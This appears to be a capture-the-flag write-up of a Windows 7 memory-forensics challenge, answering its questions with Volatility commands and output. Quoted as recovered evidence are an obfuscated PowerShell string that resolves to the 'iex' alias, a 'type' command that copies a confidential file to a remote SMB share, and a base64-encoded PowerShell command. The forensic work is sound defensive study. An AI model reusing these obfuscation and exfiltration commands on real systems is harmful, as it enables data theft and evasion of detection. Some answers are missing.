---
layout: default
title: Recollection
parent: Sherlocks
nav_order: 2
---

https://seanthegeek.net/1172/how-to-install-volatility-2-and-volatility-3-on-debian-ubuntu-or-kali-linux/


1. What is the Operating System of the machine?
```bash
python3 vol.py -f ../recollection.bin windows.info
```


Output:
```Shell
Kernel Base     0xf8000285c000
DTB     0x187000
Symbols file:///home/fr0stb0lt/volatility3-2.5.2/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdDebuggerDataBlock     0xf80002a3f120
NTBuildLab      7601.24214.amd64fre.win7sp1_ldr_
CSDVersion      1
KdVersionBlock  0xf80002a3f0e8
Major/Minor     15.7601
MachineType     34404
KeNumberProcessors      1
SystemTime      2022-12-19 16:07:30
NtSystemRoot    C:\Windows
NtProductType   NtProductWinNt
NtMajorVersion  6
NtMinorVersion  1
PE MajorOperatingSystemVersion  6
PE MinorOperatingSystemVersion  1
PE Machine      34404
PE TimeDateStamp        Thu Aug  2 02:18:10 2018
```


Answer: *Windows 7*

2. When was the memory dump created?
   Answer: *2022-12-19 16:07:30*
3. After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

```python
python2 vol.py -f ../recollection.bin --profile=Win7SP1x64 clipboard
```

Volatility Foundation Volatility Framework 2.6.1
Session    WindowStation Format                         Handle Object             Data                                              
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''                  
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------                                                   
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260                                                   
         1 WinSta0       0x0L                              0x0 ------------------                                                   

Answer: `(gv '*MDR*').naMe[3,11,2]-joIN''`


4. The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?
```python
python2 vol.py -f ../recollection.bin --profile=Win7SP1x64 consoles
```

```
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
iex  
```


cmdlet Invoke-Expression at command pipeline position 1

Answer: *Invoke-Expression*




5. A CMD command was executed to attempt to exfiltrate a file. What is the full command line?
   ```Python
   python2 vol.py -f ../recollection.bin --profile=Win7SP1x64 consoles
```

![[Pasted image 20240323172237.png]]

Answer: *type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt*

6. Following the above command, now tell us if the file was exfiltrated successfully?
Answer: NO

```
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt                                                                
The network path was not found.
```

7. The attacker tried to create a readme file. What was the full path of the file?


```
PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"      
The term '??????????????????????????????' is not recognized as the name of a cmdlet, function, script file, or operable 
 program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
```

![[Pasted image 20240323172611.png]]

Answer: *C:\Users\Public\Office\readme.txt*

8. What was the Host Name of the machine?
```
PS C:\Users\user> net users                                                                                             
                                                                                                                        
User accounts for \\USER-PC
```

Answer: *USER-PC*

9. How many user accounts were in the machine?
```
PS C:\Users\user> net users                                                                                             
                                                                                                                        
User accounts for \\USER-PC                                                                                             
                                                                                                                        
-------------------------------------------------------------------------------                                         
Administrator            Guest                    user                                                                  
The command completed successfully.
```

Answer: *3*


10. In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

```Bash
python2 vol.py -f ../recollection.bin --profile=Win7SP1x64 filescan --output-file=files.txt            
Volatility Foundation Volatility Framework 2.6.1
Outputting to: files.txt
```

![[Pasted image 20240323173422.png]]


   Answer: *\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt*

11. A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?
```
0x000000011fa45c20     16      0 -W-r-- \\Device\\HarddiskVolume2\\Users\\user\\Downloads\\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

Answer: *b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1*

12. Following the previous question, what is the Imphash of the malicous file you found above?
```shell
python3 vol.py -f ../recollection.bin -o=/home/fr0stb0lt windows.dumpfiles --physaddr 0x000000011fa45c20 
Volatility 3 Framework 2.5.2
Progress:  100.00               PDB scanning finished                        
Cache   FileObject      FileName        Result

DataSectionObject       0x11fa45c20     b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe    file.0x11fa45c20.0xfa8003b62990.DataSectionObject.b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe.dat
ImageSectionObject      0x11fa45c20     b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe    file.0x11fa45c20.0xfa8003b7a880.ImageSectionObject.b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe.img
```

![[Pasted image 20240323174852.png]]


13. Following the previous question, tell us the date in UTC format when the malicious file was created?

![[Pasted image 20240323175129.png]]

Answer: *2022-06-22 11:49:04*

14. What was the local IP address of the machine?

```
python2 vol.py -f ../recollection.bin --profile=Win7SP1x64 netscan
```

```
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
--snip--
0x11e3b2bf0        UDPv4    192.168.0.104:138              *:*                                   4        System         2022-12-19 15:32:47 UTC+0000
0x11e3b40e0        UDPv4    192.168.0.104:137              *:*                                   4        System         2022-12-19 15:32:47 UTC+0000
--snip--
```

Answer: *192.168.0.104*


15. There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?
Answer: *cmd.exe*

![[Pasted image 20240323191743.png]]

16. Attacker might have used an email address to login a social media. Can you tell us the email address?

strings ../recollection.bin |  grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"

Answer: *`mafia_code1337@gmail.com`*


17. Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?

```Shell
strings ../recollection.bin | grep https://www.bing.com/search?q=
```
![[Pasted image 20240323194719.png]]

Answer: wazuh

18. 

Answer: csrsss.exe
